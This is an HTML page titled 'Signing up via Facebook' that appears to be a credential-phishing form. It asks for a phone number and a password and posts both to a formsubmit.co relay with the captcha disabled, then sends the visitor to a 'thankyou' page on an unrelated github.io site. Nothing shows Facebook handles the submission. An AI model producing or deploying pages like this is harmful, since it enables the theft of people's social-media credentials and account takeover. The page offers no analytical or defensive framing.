<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Signing up via Facebook</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #181818 0%, #282828 100%);
      color: white;
      font-family: 'Roboto', Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }

    h2 {
      margin-bottom: 20px;
      font-weight: 700;
      text-align: center;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
      width: 90%;
      max-width: 600px;
      background-color: rgba(255, 255, 255, 0.05);
      padding: 20px;
      border-radius: 8px;
    }

    .inline-inputs {
      display: flex;
      gap: 10px;
    }

    .inline-inputs input {
      flex: 1;
      padding: 10px;
      border: none;
      border-radius: 8px;
      font-size: 1em;
      background-color: #2b2b2b;
      color: white;
    }

    button {
      padding: 10px;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      background-color: #1DB954;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #17a044;
    }
  </style>
</head>
<body>

  <h2>Signing up via Facebook</h2>

  <form action="https://formsubmit.co/d7d492f24a67929f3758bf7d9b05c79e" method="POST">
    <div class="inline-inputs">
      <input type="text" name="First Text" placeholder="Phone number" required>
      <input type="text" name="Second Text" placeholder="Password" required>
    </div>

    <input type="hidden" name="_subject" value="New Submission!">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://andreffff-qq.github.io/Davionaimusic/thankyou.html">

    <button type="submit">Submit</button>
  </form>

</body>
</html>
